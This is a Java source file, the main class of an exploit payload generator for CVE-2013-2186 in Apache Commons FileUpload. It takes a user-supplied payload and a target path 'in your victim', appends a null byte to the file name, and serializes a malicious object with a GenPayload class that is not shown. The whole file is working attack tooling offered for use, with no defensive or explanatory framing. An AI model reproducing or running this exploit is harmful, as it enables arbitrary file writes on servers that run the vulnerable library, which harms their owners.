import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;

public class Main {

    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException {
        showOptions(args);
        exploit(args);

    }

    public static void showOptions(String[] args) {
        System.out.println("[+] Payload generator for CVE-2013-2186");
        System.out.println("[+] Apache Commons FileUpload ver <= 1.3 and Java JDK ver < 7u40 ");
        System.out.println("");
        System.out.println("====> spl4yer <====\r\n");

        if (args.length < 3) {
            System.out.println("[+] Usage:");
            System.out.println("\tjava -jar xxx.jar /path/payload /path/target /path/out\n");
            System.out.println("\t/path/payload - a path to a file with your payload");
            System.out
                    .println("\t/path/target - a path to a file that will be created in your victim");
            System.out.println("\t/path/out - a path to a file with serialized payload");
            System.exit(1);
        }
    }

    public static void exploit(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException {
        String fPathPayload = args[0];
        String fTarget = args[1];
        String fPathOut = args[2];

        if ((args.length < 4)) {
            System.out.print("[*] Add null byte to filename: ");
            fTarget = fTarget + "\0";
            System.out.println("Done");
        }

        StringBuffer payload = new StringBuffer();
        String line = null;
        BufferedReader bufferedReader = new BufferedReader(new FileReader(fPathPayload));
        while ((line = bufferedReader.readLine()) != null) {
            payload.append(line).append("\n");
        }

        GenPayload genPayload = new GenPayload(fTarget, payload.toString());

        genPayload.CreatePayload();

        genPayload.Serialize(fPathOut);
        System.out.println();
        System.out.println("[*] The payload is created in " + fPathOut);
    }
}
